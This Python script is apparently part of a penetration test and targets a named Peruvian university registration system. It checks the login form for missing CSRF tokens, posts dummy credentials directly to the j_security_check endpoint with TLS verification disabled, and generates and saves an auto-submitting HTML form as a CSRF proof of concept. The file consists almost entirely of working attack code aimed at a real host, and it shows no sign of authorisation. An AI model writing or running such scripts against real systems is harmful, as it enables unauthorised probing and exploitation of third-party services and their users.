#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
})

print("=== VERIFICANDO CSRF EN SIIGAA ===\n")

# Step 1: Check login page has NO CSRF token
r = s.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
form = re.search(r'<form[^>]*>', r.text)
inputs = re.findall(r'<input[^>]*>', r.text)

print("1. Login page form:")
print(f"   {form.group(0)[:200] if form else 'No form'}")
print()
print("   Inputs found:")
for inp in inputs[:8]:
    print(f"   {inp[:150]}")

csrf_tokens = [inp for inp in inputs if 'csrf' in inp.lower() or 'token' in inp.lower() or 'nonce' in inp.lower()]
print(f"\n   CSRF tokens: {len(csrf_tokens)}")
if not csrf_tokens:
    print("   [!] NO CSRF TOKEN - VULNERABLE")

# Step 2: POST directly to j_security_check WITHOUT visiting login page
print("\n2. POST directo a j_security_check SIN visitar el login:")
s2 = requests.Session()
s2.verify = False
s2.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
})
r_post = s2.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                     data={'j_username':'fake','j_password':'fake'}, timeout=10)
cookies = dict(s2.cookies)
print(f"   Status: {r_post.status_code}")
print(f"   Cookies: {list(cookies.keys())}")
if 'JSESSIONID' in cookies:
    print("   [!] SESION CREADA SIN VISITAR LOGIN - CSRF CONFIRMADO")

# Step 3: Show the form details
print("\n3. Detalles del formulario:")
print(f"   Method: POST")
print(f"   Action: /udemsi/j_security_check")
print(f"   Username field: j_username")
print(f"   Password field: j_password")
print(f"   CSRF token: NONE")
print(f"   Requires visiting login page first: NO")

# Step 4: Create the CSRF PoC
print("\n4. CSRF PoC generado:")
csrf_html = '''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - SIIGAA</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<p>Este formulario se envia automaticamente sin que el usuario lo sepa.</p>
<form id="csrfForm" action="https://registro.uns.edu.pe/udemsi/j_security_check" method="POST">
  <input type="hidden" name="j_username" value="fake">
  <input type="hidden" name="j_password" value="fake">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>'''
print(csrf_html)

# Save the CSRF PoC
with open(r'C:\Users\Leguion T\Desktop\plan te pent\prueba\csrf_poc.html', 'w') as f:
    f.write(csrf_html)
print("\n[!] csrf_poc.html guardado")

print("\n=== COMO DEMOSTRAR ===")
print("1. Abrir csrf_poc.html en un navegador")
print("2. El formulario se envia automaticamente")
print("3. El usuario queda logueado en SIIGAA sin saberlo")
print("4. Esto demuestra CSRF")
